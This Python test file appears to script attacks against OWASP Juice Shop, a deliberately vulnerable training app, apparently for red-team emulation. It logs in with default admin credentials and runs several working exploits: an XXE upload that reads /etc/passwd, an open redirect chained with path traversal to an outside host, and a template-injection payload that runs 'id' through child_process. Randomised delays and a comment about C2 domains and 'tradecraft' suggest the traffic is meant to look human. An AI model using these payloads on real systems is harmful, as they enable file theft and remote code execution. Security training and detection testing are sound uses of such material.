import requests as r
import json
import time
import random
from config import config

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json',
    'Origin': f'{config.JUICE_URL}/',
    'Connection': 'keep-alive',
    'Referer': f'{config.JUICE_URL}/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
}

def test_b2b_xxe():
    login = {
        'email': 'admin@juice-sh.op',
        'password': 'admin123'
    }

    res = r.post(f'{config.JUICE_URL}/rest/user/login', headers=headers, json=login)
    token = json.loads(res.text.strip())['authentication']['token']

    admin_headers = headers
    admin_headers['Authorization'] = f'Bearer {token}'
    admin_headers['Cookie'] = f'token={token}'
    time.sleep(random.random() + random.randint(2,4))

    res = r.post(f'{config.JUICE_URL}/file-upload', files={"file": open("data/xxe.xml", "rb")}, headers=admin_headers)
    assert "root:x:0:0:root:/root" in res.text

def test_open_redirect_path_traversal():
    res = r.get(f"{config.JUICE_URL}/redirect?to=https://github.com/juice-shop/juice-shop")
    time.sleep(random.random() + random.randint(3,5))

    login = {
        'email': 'jim@juice-sh.op',
        'password': 'ncc-1701'
    }

    res = r.post(f'{config.JUICE_URL}/rest/user/login', headers=headers, json=login)
    token = json.loads(res.text.strip())['authentication']['token']

    auth_headers = headers
    auth_headers['Authorization'] = f'Bearer {token}'
    auth_headers['Cookie'] = f'token={token}'
    time.sleep(random.random() + random.randint(2,4))

    r.get(f"{config.JUICE_URL}/#/deluxe-membership", headers=auth_headers)
    r.get(f"{config.JUICE_URL}/main.js", headers=auth_headers)
    time.sleep(random.random() + random.randint(10,20))

    r.get(f"{config.JUICE_URL}/#/deluxe-membership?testDecal=test", headers=auth_headers)
    time.sleep(random.random() + random.randint(4,6))

    r.get(f"{config.JUICE_URL}/#/deluxe-membership?testDecal=..%2F..%2F..%2Ftest", headers=auth_headers)
    time.sleep(random.random() + random.randint(5,10))

    # I wish there was a way to replace the placekitten domain with something that seemed like a URL to a 
    # C2 domain but can't really do that when this is connected to the open internet. I would use the attacker box's
    # IP but that's not really good tradecraft.
    res = r.get(f"{config.JUICE_URL}/http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop")
    assert 'redirect?to=https://placekitten.com' in res.text

def test_profile_ssti():
    reg_data = {
        'email': 'tester@juice-sh.op',
        'password': 'password',
        'passwordRepeat': 'password',
        'securityQuestion': {
            'id': 1,
            'question': 'Your eldest siblings middle name?',
            'createdAt': '2023-07-31T14:28:06.726Z',
            'updatedAt': '2023-07-31T14:28:06.726Z',
        },
        'securityAnswer': 'bob',
    }
    res = r.post(f'{config.JUICE_URL}/api/Users/', headers=headers, json=reg_data)

    login = {
        'email': 'tester@juice-sh.op',
        'password': 'password'
    }

    res = r.post(f'{config.JUICE_URL}/rest/user/login', headers=headers, json=login)
    token = json.loads(res.text.strip())['authentication']['token']

    auth_headers = headers
    auth_headers['Authorization'] = f'Bearer {token}'
    auth_headers['Cookie'] = f'token={token}'
    time.sleep(random.random() + random.randint(2,4))

    r.get(f'{config.JUICE_URL}/profile', headers=auth_headers)
    time.sleep(random.random() + random.randint(2,4))
    r.post(f'{config.JUICE_URL}/profile', headers=auth_headers, data={'username': '#{1+1}'})
    time.sleep(random.random() + random.randint(2,4))
    res = r.post(f'{config.JUICE_URL}/profile', headers=auth_headers, data={'username': "#{global.process.mainModule.require('child_process').execSync('id')}"})
    assert 'uid=0(root) gid=0(root)' in res.text